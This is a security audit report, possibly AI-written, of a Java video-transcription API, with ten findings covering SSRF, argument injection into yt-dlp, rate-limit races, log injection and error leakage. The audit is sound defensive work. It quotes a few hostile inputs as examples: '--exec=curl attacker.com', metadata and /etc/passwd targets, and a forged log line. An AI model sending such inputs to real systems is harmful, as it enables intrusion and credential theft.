## Detailed Findings

### 1. 🔴 CRITICAL — Command Injection / SSRF via `videoUrl`

**Location**: `VideoService.extractAudioAndMetadata()` → `ProcessRunner.runCommand()`

The user-supplied `videoUrl` is passed directly as an argument to `yt-dlp` via `ProcessBuilder`:

```java
command.add(videoUrl);  // line 131 of VideoService
processExecutor.run(command.toArray(new String[0]));
```

While `ProcessBuilder` with a `String[]` is safer than a shell-concatenated string (no shell metacharacter interpretation), `yt-dlp` itself accepts dangerous arguments and URLs:

- **SSRF / Internal Network Scanning**: A user can submit `http://169.254.169.254/latest/meta-data/` (AWS metadata endpoint) or any internal `http://10.x.x.x/` URL. `yt-dlp` will make HTTP requests to internal infrastructure.
- **Local file read**: URLs like `file:///etc/passwd` could be attempted.
- **Argument injection**: If a URL starts with `--` (e.g., `--exec=curl attacker.com`), `yt-dlp` could interpret it as a flag rather than a URL. There is no `--` separator before `videoUrl` in the command to prevent this.

**Recommendation**:
- Add URL validation — allowlist of schemes (`https://` only) and domain patterns (e.g., `tiktok.com`, `youtube.com`).
- Add `--` before the URL argument to prevent argument injection: `command.add("--"); command.add(videoUrl);`
- Block RFC1918/link-local/metadata IP ranges.

### 2. 🔴 HIGH — No URL Validation at All

**Location**: `VideoController.validateRequest()`

```java
private void validateRequest(String videoUrl, UserPrincipal principal) {
    if (videoUrl == null || videoUrl.isBlank()) {
        throw new IllegalArgumentException("Missing 'videoUrl' in request body");
    }
    if (principal == null) {
        throw new IllegalArgumentException("User not authenticated");
    }
}
```

The only check is `null || blank`. There is zero validation of:
- URL scheme (http, https, ftp, file, data, javascript…)
- URL format (is it even a valid URL?)
- Domain allowlist (should only accept video platform domains)
- URL length (the DB column is `VARCHAR(2048)`, but the app doesn't enforce this — could cause DB errors or truncation)

**Recommendation**: Validate with `java.net.URI`, enforce `https://` scheme only, allowlist video platform domains, and enforce max length before DB insertion.

### 3. 🟠 HIGH — Rate Limit Bypass via TOCTOU Race Condition

**Location**: `TranscriptionJobService.createOrGetExisting()` and `VideoController.handleVideo()`

The rate limit is checked **before** `createOrGetExisting()`, but the rate limit usage is only recorded **after successful completion**:

```java
// Check rate limit ← checked here
RateLimitResult rateLimitResult = rateLimitService.checkRateLimit(userId);

// Create job
TranscriptionJobEntity job = transcriptionJobService.createOrGetExisting(userId, videoUrl);

// ... process ...
rateLimitService.recordTranscription(userId); // ← recorded only on success
```

**Exploit**: A user can submit many different URLs concurrently. Since `checkRateLimit` is a read-only check and `recordTranscription` only happens after completion, concurrent requests between the check and the record all pass the rate limit. The per-minute limit of 5 is easily bypassed by sending 50 requests simultaneously — all 50 will pass the check before any of them records usage.

**Recommendation**: Use an atomic check-and-reserve pattern (e.g., `UPDATE ... SET count = count + 1 WHERE count < limit RETURNING count`) or record usage at submission time, not completion time.

---

### 4. 🟠 HIGH — Rate Limit Not Re-checked for Async Job Processing

**Location**: `JobPollerService.executeJob()`

When the poller picks up an async job, it records rate limit usage after processing but never re-checks the rate limit at processing time. A user could:
1. Submit many async jobs when they have capacity.
2. The poller processes them all without re-verifying the user still has remaining quota.

This is partially mitigated by the check at submission time, but combined with the TOCTOU race above, it compounds the issue.

**Recommendation**: Re-check rate limits in the poller before processing. If the user is over quota, move the job to FAILED rather than processing it.

### 5. 🟠 MEDIUM — Log Injection

**Location**: `VideoController` lines 48 and 94

```java
log.info("POST /api/video/transcribe received for videoUrl={}", videoUrl);
```

The user-controlled `videoUrl` is logged directly. If using a log framework that doesn't sanitize newlines, an attacker can inject fake log lines:

```
videoUrl = "https://evil.com\n2026-03-28 INFO - User admin logged in successfully"
```

**Recommendation**: Sanitize log inputs by stripping/replacing newlines and control characters before logging.

---

### 6. 🟡 MEDIUM — Untyped Request Body (No DTO Validation)

**Location**: `VideoController.handleVideo()` and `transcribeAsync()`

```java
@RequestBody Map<String, String> request
```

Using a raw `Map<String, String>` instead of a validated DTO bypasses Spring's `@Valid` / Bean Validation entirely. Compare with `UntranscribedLinkController` which correctly uses `@Valid @RequestBody AddLinkRequest`. This means:
- No `@NotBlank`, `@Size`, `@Pattern` constraints
- Extra/unexpected fields silently accepted
- No OpenAPI schema generated for the request body

**Recommendation**: Create a `TranscribeRequest` DTO with proper validation annotations (`@NotBlank`, `@URL`, `@Size(max=2048)`, `@Pattern` for allowed domains).

---

### 7. 🟡 MEDIUM — TOCTOU in Job Deduplication

**Location**: `TranscriptionJobService.createOrGetExisting()`

Although marked `@Transactional`, without a unique constraint on `(user_id, video_url)` for active statuses, two concurrent requests for the same URL could both pass the `findByUserIdAndVideoUrlAndStatusIn` check and both create PENDING jobs. The code relies on application-level dedup, not DB-level enforcement.

**Recommendation**: Add a unique partial index: `CREATE UNIQUE INDEX ON transcription_jobs(user_id, video_url) WHERE status IN ('PENDING', 'PROCESSING')`.

---

### 8. 🟡 MEDIUM — No Resource Limits (Video Size/Duration)

There are no limits on:
- **Video duration** — a user could submit a 10-hour video, consuming disk space and Whisper API credits.
- **File size** — temp files from `yt-dlp` could fill the disk.
- **Concurrent jobs per user** — a user can have unlimited PENDING jobs in the queue.

**Recommendation**: 
- Add `--max-filesize` and `--match-filter "duration<600"` flags to the `yt-dlp` command. 
- Limit concurrent pending jobs per user (e.g., max 10 PENDING jobs at a time).

---

### 9. 🟡 MEDIUM — Error Message Information Leakage

**Location**: `GlobalExceptionHandler.handleGenericException()`

```java
ErrorResponse error = new ErrorResponse(
    status.value(), status.getReasonPhrase(),
    ex.getMessage(),  // ← raw exception message exposed to client
    path
);
```

Internal exception messages (potentially containing stack traces, file paths, DB details) are returned directly to the caller. The `handleFailure` method also stores `ex.getMessage()` in the DB and the `JobStatusDto` likely exposes `errorMessage` to end users.

**Recommendation**: Return generic error messages to clients. Store detailed errors internally only.

---

### 10. 🟢 LOW — CSRF and CORS Disabled

**Location**: `SecurityConfig`

```java
.cors(cors -> cors.disable())
.csrf(csrf -> csrf.disable())
```

- CSRF is disabled globally. For a stateless JWT API this is acceptable, but if any session-based flows are ever added, this becomes a vulnerability.
- CORS is fully disabled rather than configured with an allowlist. Any origin can make requests to this API (assuming the client has the JWT token).

**Recommendation**: Configure CORS with an explicit origin allowlist rather than disabling it entirely.
